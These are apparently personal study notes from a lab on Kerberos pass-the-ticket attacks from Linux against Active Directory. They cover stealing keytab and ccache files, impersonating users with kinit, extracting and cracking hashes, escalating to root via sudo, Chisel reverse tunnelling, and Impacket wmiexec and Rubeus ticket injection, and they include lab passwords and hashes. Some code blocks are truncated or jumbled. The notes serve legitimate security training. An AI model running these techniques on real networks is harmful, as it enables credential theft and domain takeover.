- A Linux computer connected to Active Directory commonly uses Kerberos as authentication.
- Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.
- In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.
- Another everyday use of Kerberos in Linux is with [keytab](https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro) files. A `keytab` is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.
> **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

## Identifying Linux and Active Directory integration

We can identify if the Linux machine is domain-joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

```shell-session
david@inlanefreight.htb@linux01:~$ realm list
```

- In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html).

#### PS - Check if Linux machine is domain-joined

```shell-session
ps -ef | grep -i "winbind\|sssd"
```

## Finding Kerberos tickets in Linux

Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings.

### Finding KeyTab files

```shell-session
find / -name *keytab* -ls 2>/dev/null
```

> **Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

Another way to find `KeyTab` files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script. Let's see this example:

#### Identifying KeyTab files in Cronjobs

```shell-session
carlos@inlanefreight.htb@linux01:~$ crontab -l
```

In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.

> **Note:** As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

## Finding ccache files

- A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts.
- Once a user authenticates to the domain, a ccache file is created that stores the ticket information.
- The path to this file is placed in the `KRB5CCNAME` environment variable.
- This variable is used by tools that support Kerberos authentication to find the Kerberos data.

#### Reviewing environment variables for ccache files.

```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

`ccache` files are located, by default, at `/tmp`. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.

#### Searching for ccache files in /tmp

```shell-session
david@inlanefreight.htb@linux01:~$ ls -la /tmp
```

## Abusing KeyTab files

As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using `kinit`. To use a keytab file, we need to know which user it was created for. `klist` is another application used to interact with Kerberos on Linux. This application reads information from a `keytab` file. Let's see that with the following command:

#### Listing KeyTab file information

```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.

> **Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

#### Impersonating a user with a KeyTab

```shell-session
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

- We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.
#### Connecting to SMB Share as Carlos

  Pass the Ticket (PtT) from Linux

```shell-session
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

> **Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

### KeyTab Extract

The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.

We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.

#### Extracting KeyTab hashes with KeyTabExtract

  Pass the Ticket (PtT) from Linux

```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.


> **Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as [https://crackstation.net/](https://crackstation.net/), which contains billions of passwords.

- we cracked the password ("password5") using crackstation 

### Obtaining more hashes

Carlos has a cronjob that uses a KeyTab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.

## Abusing KeyTab ccache

To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.

Once we log in with the credentials for the user `svc_workstations`, we can use `sudo -l` and confirm that the user can execute any command as root. We can use the `sudo su` command to change the user to root.

#### Privilege escalation to root

```shell-session
rithikManoj000@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                  
svc_workstations@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)          
...SNIP...

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
```

As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.

#### Looking for ccache files

  Pass the Ticket (PtT) from Linux

```shell-session
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .

```



There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using `id`.

#### Identifying group membership with the id command

```shell-session
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Julio is a member of the `Domain Admins` group. We can attempt to impersonate the user and gain access to the `DC01` Domain Controller host.

To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

#### Importing the ccache file into our current session

  Pass the Ticket (PtT) from Linux

```shell-session
root@linux01:~# klist

> **Note:** klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

## Using Linux attack tools with Kerberos

Many Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

In this scenario, our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

#### Host file modified

  Pass the Ticket (PtT) from Linux

```shell-session
HrithikManoj000@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

We need to modify our proxychains configuration file to use socks5 and port 1080.

#### Proxychains configuration file

  Pass the Ticket (PtT) from Linux

```shell-session
HrithikManoj000@htb[/htb]$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
```

#### Download Chisel to our attack host

  Pass the Ticket (PtT) from Linux

```shell-session
HrithikManoj000@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
HrithikManoj000@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
HrithikManoj000@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
HrithikManoj000@htb[/htb]$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled

```

Connect to `MS01` via RDP and execute chisel (located in C:\Tools).

#### Connect to MS01 with xfreerdp

  Pass the Ticket (PtT) from Linux

```shell-session
HrithikManoj000@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

#### Execute chisel from MS01

  Pass the Ticket (PtT) from Linux

```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

> **Note:** The client IP is your attack host IP.

Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.

#### Setting the KRB5CCNAME environment variable

```bash
HrithikManoj000@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Impacket

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.

#### Using Impacket with proxychains and Kerberos authentication

```
proxychains impacket-wmiexec dc01 -k 
```

![[Pasted image 20260228084614.png]]

#### Impacket Ticket converter (convert ccache file to kirbi and vice versa to be used on windows or linux)

```
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

**We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.**

#### Importing converted ticket into Windows session with Rubeus

```
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```
